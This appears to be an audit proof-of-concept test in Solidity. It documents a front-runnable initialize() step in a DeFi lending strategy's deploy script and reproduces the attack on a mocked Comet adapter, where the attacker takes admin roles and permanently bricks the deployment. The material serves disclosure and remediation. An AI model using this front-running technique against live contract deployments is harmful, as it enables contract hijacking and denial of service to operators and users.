// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * FINDING: The exact same front-runnable `initialize()` pattern shown against
 *          StrategyBootstrapper in BootstrapperFrontRun_AdapterHijack.t.sol
 *          is NOT an isolated case -- it is how the shipped deploy script
 *          (script/DeployUsdcLendingStrategy.s.sol) deploys EVERY SINGLE
 *          lending adapter. Grep of that script:
 *
 *              aave.initialize(..., cfg.deployer, address(result.strategy), ...);        (line 341)
 *              MorphoUsdcMultiMarketAdapter morph = new MorphoUsdcMultiMarketAdapter();   (346) morph.initialize(...)          (347)
 *              CometUsdcMultiMarketAdapter cmt = new CometUsdcMultiMarketAdapter();       (352) cmt.initialize(...)            (353)
 *              EulerUsdcMultiMarketAdapter euler = new EulerUsdcMultiMarketAdapter();     (364) euler.initialize(...)          (365)
 *              DolomiteUsdcMultiMarketAdapter dolo = new DolomiteUsdcMultiMarketAdapter();(379) dolo.initialize(...)           (380)
 *              FluidUsdcMultiMarketAdapter fluid = new FluidUsdcMultiMarketAdapter();     (385) fluid.initialize(...)          (386)
 *              VenusUsdcMultiMarketAdapter venus = new VenusUsdcMultiMarketAdapter();     (391) venus.initialize(...)          (392)
 *
 * Every adapter is deploy-then-initialize as TWO SEPARATE on-chain
 * transactions (Comet demonstrated here; the identical `new X(); X.initialize(...)`
 * two-step appears for all 7 adapters). Each adapter's `initialize()` grants
 * `admin_` DEFAULT_ADMIN_ROLE + PARAM_ROLE on that specific adapter contract
 * and records `vault_` for the `onlyVault` gate (e.g.
 * CometUsdcMultiMarket.sol:173-196). Whoever's `initialize()` call is mined
 * first wins.
 *
 * The codebase already contains the correct fix for exactly this problem --
 * `src/strategies/usdc-lending/factory/AdapterFactory.sol` bundles CREATE2
 * deploy + initialize into one atomic transaction specifically "to eliminate
 * the front-run window between deploy and initialize" (its own docstring) --
 * but `DeployUsdcLendingStrategy.s.sol`, the actual script used to deploy the
 * strategy, does not use it for any of the 7 adapters or the bootstrapper.
 *
 * SEVERITY: HIGH-CRITICAL at deployment time. An attacker front-running any
 *           one adapter's `initialize()` call can: (a) set `admin_`/`vault_`
 *           to attacker-controlled addresses, taking DEFAULT_ADMIN_ROLE +
 *           PARAM_ROLE on that adapter and pointing its `onlyVault` gate away
 *           from the real strategy, permanently bricking that specific,
 *           deterministically-addressed adapter contract for the legitimate
 *           deployment (its real `initialize()` call reverts thereafter --
 *           denial of service on that market for the life of the deployment,
 *           since the adapter address was likely already referenced/predicted
 *           elsewhere in the deploy sequence); or (b), depending on downstream
 *           wiring assumptions, potentially worse if anything trusts the
 *           adapter's address as "the real Aave/Comet/etc. market" before
 *           verifying who actually holds its roles.
 *
 * This PoC reproduces the front-run against the Comet adapter specifically
 * (reusing the existing MockComet/MockUSDCComet/SimpleProtocolRegistry test
 * infrastructure), but the vulnerability is systemic across all 7 adapters.
 */

import { Test, console2 } from "forge-std/Test.sol";
import {
    CometUsdcMultiMarketAdapter
} from "../../../../src/strategies/usdc-lending/adapters/lending/CometUsdcMultiMarket.sol";
import { SimpleProtocolRegistry } from "../../../helpers/SimpleProtocolRegistry.sol";
import { MockUSDCComet, MockComet } from "../adapters/CometUsdcMultiMarketAdapter.t.sol";

contract AdapterInitializeFrontRun_Comet_PoC is Test {
    address deployer = address(0xD00D);   // the legitimate operator running the deploy script
    address attacker = address(0xBAD);    // holds no role anywhere, front-runs the mempool
    address realStrategy = address(0x51A7E617);

    function test_POC_attacker_frontruns_comet_adapter_initialize() public {
        MockUSDCComet usdc = new MockUSDCComet();
        MockComet comet1 = new MockComet(address(usdc));

        SimpleProtocolRegistry registry = new SimpleProtocolRegistry();
        registry.addVault(
            SimpleProtocolRegistry.ProtocolType.COMPOUND_V3,
            address(comet1),
            "MockComet1",
            10000,
            100_000_000e6
        );

        // --- Phase 1.5 of DeployUsdcLendingStrategy.s.sol, tx 1 of 2 ---
        vm.prank(deployer);
        CometUsdcMultiMarketAdapter cmt = new CometUsdcMultiMarketAdapter();

        // *** THE WINDOW ***
        // On a real chain, "cmt.initialize(chainCfg.usdc, cfg.deployer,
        // address(result.strategy), CAP, registry);" is now sitting in the
        // mempool as tx 2 of 2. Nothing about the already-deployed `cmt`
        // contract restricts who can call initialize() first.
        MockComet attackerComet = new MockComet(address(usdc));
        SimpleProtocolRegistry attackerRegistry = new SimpleProtocolRegistry();
        attackerRegistry.addVault(
            SimpleProtocolRegistry.ProtocolType.COMPOUND_V3,
            address(attackerComet),
            "AttackerComet",
            10000,
            1e6
        );

        vm.prank(attacker);
        cmt.initialize(address(usdc), attacker, attacker, 0, address(attackerRegistry));

        assertTrue(cmt.hasRole(cmt.DEFAULT_ADMIN_ROLE(), attacker), "VULNERABLE: attacker holds DEFAULT_ADMIN_ROLE on the real adapter contract address");
        assertTrue(cmt.hasRole(cmt.PARAM_ROLE(), attacker), "VULNERABLE: attacker holds PARAM_ROLE too");
        assertEq(cmt.vault(), attacker, "VULNERABLE: onlyVault now points at the attacker, not the real strategy");

        // The legitimate deploy script's own initialize() call for this exact
        // adapter now reverts -- deployment of this market is permanently
        // bricked (initializer is one-shot; there is no retry path).
        vm.prank(deployer);
        vm.expectRevert(bytes("Initializable: contract is already initialized"));
        cmt.initialize(address(usdc), deployer, realStrategy, 10_000_000e6, address(registry));
    }
}
